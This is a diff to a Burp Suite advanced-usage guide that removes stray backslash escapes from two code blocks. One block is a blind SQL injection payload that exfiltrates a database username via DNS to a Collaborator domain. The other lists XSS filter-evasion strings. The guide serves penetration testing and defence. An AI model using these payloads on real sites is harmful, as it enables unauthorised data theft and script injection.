@@ -391,9 +391,9 @@ This guide covers advanced techniques and workflows for experienced Burp Suite u
       
       Example advanced Collaborator payload for blind SQL injection:
       ```sql
-      ' UNION SELECT LOAD_FILE\(CONCAT\('\\\\',
-      \(SELECT HEX\(username\) FROM users LIMIT 1\),
-      '.collaborator-domain.burpcollaborator.net\\share\\file'\)\) -- 
+      ' UNION SELECT LOAD_FILE(CONCAT('\\',
+      (SELECT HEX(username) FROM users LIMIT 1),
+      '.collaborator-domain.burpcollaborator.net\share\file')) -- 
       ```
       
       This payload attempts to exfiltrate a username via DNS, encoding it as a subdomain in the Collaborator request.
@@ -525,11 +525,11 @@ This guide covers advanced techniques and workflows for experienced Burp Suite u
       
       Example evasion techniques for XSS:
       ```
-      Standard: <script>alert\(1\)</script>
-      Evasion 1: <sCrIpT>alert\(1\)</sCrIpT>
-      Evasion 2: <script>al\u0065rt\(1\)</script>
-      Evasion 3: <img src=x onerror="alert\(1\)">
-      Evasion 4: <svg/onload=alert\(1\)>
+      Standard: <script>alert(1)</script>
+      Evasion 1: <sCrIpT>alert(1)</sCrIpT>
+      Evasion 2: <script>al\u0065rt(1)</script>
+      Evasion 3: <img src=x onerror="alert(1)">
+      Evasion 4: <svg/onload=alert(1)>
       ```
       
       Understanding evasion techniques helps security teams improve their defensive measures and build more robust protections.
